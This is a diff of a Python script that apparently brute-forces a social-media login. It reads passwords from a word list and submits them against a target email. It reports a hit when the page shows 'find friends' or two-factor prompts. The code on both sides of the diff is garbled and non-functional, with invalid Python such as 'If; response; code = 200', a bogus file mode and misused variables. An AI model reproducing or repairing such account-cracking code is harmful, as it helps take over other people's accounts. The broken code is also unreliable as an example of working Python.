@@ -1,3 +1,4 @@
+import requests
 import sys 
 import os
 import time
@@ -41,11 +42,12 @@ print(" TARGET MAIL /PROF LINK:",email+"")
 
 i=0
 while file:
-       password=file.readline().strip()
-       i+=1
-       if len(password) < 10:
-	       continue
-       print=str(i) +" : ",password
+    file=open('password.txt','o','r' )
+    file.readline()
+    i=+1
+    if len(file) < 11:
+        continue
+    print("Trying ",file+"")
 excepthandler
 
 ConnectionError
@@ -56,14 +58,14 @@ print('\033[1;31mNO INTERNET CONNECTION OR CONNECTION TIMEOUT\033[1;0m')
 request = web.open(urlopen)
 Try
  
-If; response; code = 200
+If; responses; code = 200
 web.select_form(nr=0)()
 web.form['email']=email
-web.form['pass']=password
-response = web.submit()
-response_data = response.read()
-'find friends' in response_data or 'two-factor authentication' in response_data or 'security code' in response_data;
-print("your password is : ",password)
+web.form['pass']=file
+responses = web.submit()
+responses_data = responses.read()
+'find friends' in responses_data or 'two-factor authentication' in responses_data or 'security code' in responses_data;
+print("your password is : ",file)
 Break
 
 
